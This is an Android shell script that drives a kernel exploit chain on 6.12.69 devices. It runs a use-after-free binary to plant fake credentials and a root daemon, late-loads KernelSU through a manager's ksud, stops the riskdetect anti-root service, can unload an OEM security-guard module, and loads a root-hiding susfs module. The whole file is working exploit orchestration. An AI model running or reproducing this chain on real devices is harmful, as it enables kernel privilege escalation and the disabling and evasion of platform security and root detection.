#!/system/bin/sh
# 6.12.69-ex: fast-tuned YuKongA timer -> rootd -> manager ksud install/late-load.
# Mirrors the 98260 branch: plant/rootd, then external ksud and manager.
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
UNLOAD_GUARD=${PYB110_UNLOAD_GUARD:-0}
case "$MANAGER" in
  finasu) MPKG=me.yuki.fina ;;
  next) MPKG=com.rifsxd.ksunext ;;
  bakasu) MPKG=com.resukisu.resukisu ;;
  sukisu) MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; MPKG=me.weishu.kernelsu ;;
esac
KMI=android16-6.12
SOCK=/data/local/tmp/t61269-root.sock
echo "MANAGER=$MANAGER PKG=$MPKG KMI=$KMI"

KERNEL=$(uname -r 2>/dev/null)
case "$KERNEL" in
  *6.12.69*) ;;
  *) echo "KERNEL_MISMATCH: $KERNEL (6.12.69-ex needs a 6.12.69 kernel)"; exit 10 ;;
esac
echo "KERNEL=$KERNEL"

chmod 755 t61269 t61269_su 2>/dev/null
BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '-' | tr -d '\r')
UPTIME=$(cut -d. -f1 /proc/uptime 2>/dev/null)
echo "BOOT_ID=$BOOT_ID UPTIME=${UPTIME}s"
STALE_PID=""
for p in $(pidof t61269 2>/dev/null); do
  [ -r "/proc/$p/comm" ] || continue
  comm=$(cat "/proc/$p/comm" 2>/dev/null)
  [ "$comm" = "t61269" ] || continue
  st=$(awk '{print $22}' "/proc/$p/stat" 2>/dev/null)
  clk=$(getconf CLK_TCK 2>/dev/null)
  [ -z "$clk" ] && clk=100
  started=$(( ${st:-0} / clk ))
  cmd=$(tr '\000' ' ' < "/proc/$p/cmdline" 2>/dev/null)
  echo "STALE_CHECK pid=$p comm=$comm started=${started}s uptime=${UPTIME}s cmd=$cmd"
  [ "$started" -le "${UPTIME:-0}" ] && STALE_PID=$p
done
if [ -n "$STALE_PID" ]; then
  echo "STALE_PLANT: t61269 pid=$STALE_PID from this boot is still holding the page; a cold power-off/on is required (zygote soft reboot does not clear it)"
  exit 12
fi
if grep -qi '^kernelsu ' /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit"
  su -c "id" 2>&1 | head -2
  exit 0
fi

APK=$(pm path "$MPKG" 2>/dev/null | sed -n 's/^package://p' | head -n 1)
KSUD=""
KSUD_SOURCE=""
if [ -n "$APK" ]; then
  LIBDIR="$(dirname "$APK")/lib/arm64"
  if [ -x "$LIBDIR/libksud.so" ]; then
    KSUD="$LIBDIR/libksud.so"
    KSUD_SOURCE=manager-apk
  fi
  # Some managers randomize the embedded ksud payload name (SukiSU). Execute
  # each large native payload in place and keep the one that identifies as ksud.
  if [ -z "$KSUD" ]; then
    for f in "$LIBDIR"/lib*.so; do
      [ -x "$f" ] || continue
      sz=$(wc -c < "$f" 2>/dev/null)
      [ "${sz:-0}" -gt 2000000 ] || continue
      ver=$(timeout 3 "$f" --version 2>/dev/null | head -n 1)
      case "$ver" in
        *uapi*)
          KSUD="$f"
          KSUD_SOURCE=manager-payload
          echo "KSUD_MANAGER_PAYLOAD=$f $ver"
          break
          ;;
      esac
    done
  fi
fi
[ -x "$KSUD" ] || { KSUD=$(find /data/app -path "*${MPKG}*/lib/arm64/libksud.so" 2>/dev/null | head -n 1); [ -n "$KSUD" ] && KSUD_SOURCE=manager-apk; }
[ -x "$KSUD" ] || { KSUD=$(find /data/app -path "*${MPKG}*" -name libksud.so 2>/dev/null | head -n 1); [ -n "$KSUD" ] && KSUD_SOURCE=manager-apk; }
[ -x "$KSUD" ] || { KSUD=/data/adb/ksu/bin/ksud; [ -x "$KSUD" ] && KSUD_SOURCE=data-adb; }
[ -x "$KSUD" ] || { KSUD=/data/adb/ksud; [ -x "$KSUD" ] && KSUD_SOURCE=data-adb; }
[ -x "$KSUD" ] || KSUD=""
echo "KSUD=${KSUD:-none} source=${KSUD_SOURCE:-none}"
[ -n "$KSUD" ] && echo "KSUD_VERSION=$("$KSUD" --version 2>&1 | head -n 1)"
if [ -z "$KSUD" ]; then
  echo "KSUD_MISSING: install the manager APK (pkg=$MPKG) first; ksud is executed from its APK, no bundled copy"
  exit 14
fi

start_antiroot_guard() {
  if [ "$DISABLE_ANTIROOT" != "1" ]; then
    echo "ANTIROOT_SKIP: switch off; riskdetect not stopped"
    return 0
  fi
  setsid sh -c "
    n=0
    while [ \$n -lt 100 ]; do
      su -c 'stop riskdetect' >/dev/null 2>&1 && break
      sleep 0.1
      n=\$((n+1))
    done
    st=\$(su -c 'getprop init.svc.riskdetect' 2>/dev/null | tr -d '\r')
    echo \"ANTIROOT_STOPPED state=\$st\" >> '$D/antiroot.log'
  " >/dev/null 2>&1 &
  echo "ANTIROOT_GUARD_BG: stop riskdetect HAL requested (no restore; restored on reboot)"
}

unload_guard() {
  if [ "$UNLOAD_GUARD" = "1" ]; then
    echo "UNLOAD_GUARD: rmmod oplus_secure_guard_new"
    su -c "rmmod oplus_secure_guard_new" 2>&1
    echo "UNLOAD_GUARD_RC=$?"
    if grep -qi oplus_secure_guard /proc/modules 2>/dev/null; then
      echo "UNLOAD_GUARD_STILL_LOADED"
    else
      echo "UNLOAD_GUARD_GONE"
    fi
  else
    echo "UNLOAD_GUARD_SKIP"
  fi
}

susfs_loaded() {
  su -c "test -d /sys/module/susfs_guard_lkm || test -e /proc/susfs_kstat || test -e /proc/susfs_path" 2>/dev/null
}

load_susfs() {
  if [ "${PYB110_SUSFS:-0}" != "1" ]; then
    echo "SUSFS_SKIP"
    return 0
  fi
  if [ ! -f "$D/susfs_guard_lkm-6.12.ko" ]; then
    echo "SUSFS_MISSING"
    return 0
  fi
  if susfs_loaded; then
    echo "SUSFS_ALREADY"
    return 0
  fi
  for c in "$KSUD" /data/adb/ksud /data/adb/ksu/bin/ksud; do
    [ -n "$c" ] || continue
    echo "SUSFS_INSMOD_TRY=$c"
    su -c "$c insmod '$D/susfs_guard_lkm-6.12.ko' expose_proc=1" 2>&1
    sleep 1
    if susfs_loaded; then
      echo "SUSFS_LOADED"
      return 0
    fi
  done
  echo "SUSFS_INSMOD_FALLBACK=insmod"
  su -c "insmod '$D/susfs_guard_lkm-6.12.ko' expose_proc=1" 2>&1
  sleep 1
  if susfs_loaded; then
    echo "SUSFS_LOADED"
  else
    echo "SUSFS_LOAD_FAIL"
  fi
}

wait_kernelsu_shell() {
  n=0
  while [ $n -lt 30 ]; do
    if grep -qi '^kernelsu ' /proc/modules 2>/dev/null; then
      return 0
    fi
    if timeout 3 su -c id 2>/dev/null | grep -q "uid=0"; then
      echo "KSU_HIDDEN: module not visible in /proc/modules but su works"
      return 0
    fi
    sleep 1
    n=$((n+1))
    [ $((n % 5)) -eq 0 ] && echo "WAIT_KSU=$n"
  done
  return 1
}

echo "[1/4] plant (UAF -> fake cred -> rootd)"
rm -f t61269.log "$SOCK" /data/local/tmp/t61269-retire
: > t61269.log
tail -n +1 -f t61269.log 2>/dev/null &
TAILPID=$!
setsid sh -c "./t61269 fake > t61269.log 2>&1" &
i=0
ROOTED=0
while [ $i -lt 60 ]; do
  sleep 1
  i=$((i+1))
  if grep -q "ROOTD_READY" t61269.log 2>/dev/null; then ROOTED=1; break; fi
  if grep -q "parking without reap" t61269.log 2>/dev/null; then
    echo "PLANT_FAIL_MISS: spray missed, t61269 parked (page held); cold reboot required"
    break
  fi
  if ! pidof t61269 >/dev/null 2>&1; then
    echo "TOOL_EXITED"
    break
  fi
  [ $((i % 5)) -eq 0 ] && echo "WAIT_ROOTD=$i"
done
kill $TAILPID 2>/dev/null
wait $TAILPID 2>/dev/null
if [ "$ROOTED" != "1" ]; then
  echo "PLANT_FAIL: no rootd (enforce=$(getenforce 2>/dev/null)); do NOT kill t61269, cold reboot required"
  exit 13
fi
echo "PLANT_OK: rootd ready"
if ./t61269_su -c "test -d /sys/fs/pstore" >/dev/null 2>&1; then
  echo "PSTORE_TAIL:"
  ./t61269_su -c "cat /sys/fs/pstore/console-ramoops* 2>/dev/null | tail -n 200" 2>&1
fi

start_antiroot_guard
# The rootd connection must be established while SELinux is still permissive:
# once late-load brings KSU up, the kernel re-enables Enforcing and a new rootd
# connect is denied.  ksud install and the guard unload run after su instead,
# matching the 98260 branch's ordering.
echo "[2/4] late-load via $MANAGER"
CMD="$KSUD late-load --kmi $KMI --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25 ; if grep -qi '^kernelsu ' /proc/modules 2>/dev/null || /system/bin/su -c id 2>/dev/null | grep -q uid=0; then touch /data/local/tmp/t61269-retire; fi"
./t61269_su -c "$CMD" 2>&1
if ! wait_kernelsu_shell; then
  echo "LATE_LOAD_RETRY: without --kmi"
  CMD="$KSUD late-load --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25 ; if grep -qi '^kernelsu ' /proc/modules 2>/dev/null || /system/bin/su -c id 2>/dev/null | grep -q uid=0; then touch /data/local/tmp/t61269-retire; fi"
  ./t61269_su -c "$CMD" 2>&1
fi
if ! wait_kernelsu_shell; then
  echo "LOAD_FAIL: module not live; rootd kept (do not kill t61269, full reboot)"
  exit 15
fi
echo "MODULE_LOADED"

echo "[3/4] wait for su"
n=0
SUOK=0
while [ $n -lt 300 ]; do
  if su -c id 2>/dev/null | grep -q "uid=0"; then
    SUOK=1
    break
  fi
  sleep 0.1
  n=$((n+1))
done
echo "SU_WAIT=$n su_ok=$SUOK"
if [ "$SUOK" = "1" ]; then
  su -c id 2>&1 | head -2
else
  echo "SU_NOT_READY: module is live but su is not usable; rootd kept"
fi

if [ "$SUOK" = "1" ]; then
  unload_guard
  su -c "$KSUD install" 2>&1
  echo "KSUD_INSTALL_RC=$?"
  echo "ANTIROOT_STATE=$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')"
  if [ "$MANAGER" = "finasu" ] && [ -n "$APK" ]; then
    su -c "$KSUD dynamic set-apk '$APK'" 2>&1
    echo "DYNAMIC_SET_APK_RC=$?"
  fi
  load_susfs
  DIS=$(su -c "pm list packages -d --user 0" 2>/dev/null | tr -d '\r')
  for p in com.oplus.exsystemservice com.oplus.screenshot; do
    if su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p"; then
      if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
        su -c "pm enable --user 0 '$p'" >/dev/null 2>&1
        echo "SCREENSHOT_STACK_ENABLED=$p"
      fi
    fi
  done
  # Retire the rootd like YuKongA's design: the fake-cred child exits normally
  # and the parent parks holding the sprayed page.  Do not kill the parent and
  # do not leave a long-lived fake-cred task around.
  if ./t61269_su -c true >/dev/null 2>&1; then
    echo "ROOTD_STILL_UP: fake child did not auto-retire; cold reboot before rerun"
  else
    echo "ROOTD_RETIRED: fake child exited; parent parked; cold reboot before rerun"
  fi
else
  echo "ROOTD_KEPT: no su; full reboot before rerun"
fi

echo "[4/4] manager"
echo "MANAGER_START=late-load"
echo DONE
